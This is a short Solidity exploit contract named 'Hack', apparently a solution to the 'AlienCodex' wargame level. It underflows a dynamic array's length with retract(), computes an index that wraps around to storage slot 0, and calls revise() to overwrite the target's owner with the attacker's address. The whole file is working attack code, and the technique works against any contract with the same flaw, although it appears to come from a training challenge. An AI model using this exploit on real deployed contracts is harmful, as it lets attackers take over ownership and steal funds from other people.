pragma solidity ^0.8;

interface IAlienCodex {
  function owner() external view returns (address);
  function codex(uint) external view returns (bytes32);
  function retract() external;
  function make_contact() external;
  function revise(uint i, bytes32 _content) external;
}

contract Hack {
  /*
  storage
  0 - owner
  0 - contact
  1 - length of the array codex
  // slot where array element is stored = keccak256(slot)) + index
  */
  constructor(IAlienCodex target) {
    target.make_contact();
    target.retract();

    uint s = uint(keccak256(abi.encode(uint(1))));
    uint i;
    unchecked {
      // s + i = 0 = 2**256
      i -= s;
    }

    target.revise(i, bytes32(uint256(uint160(msg.sender))));
    require(target.owner() == msg.sender, "hack failed");
  }
}
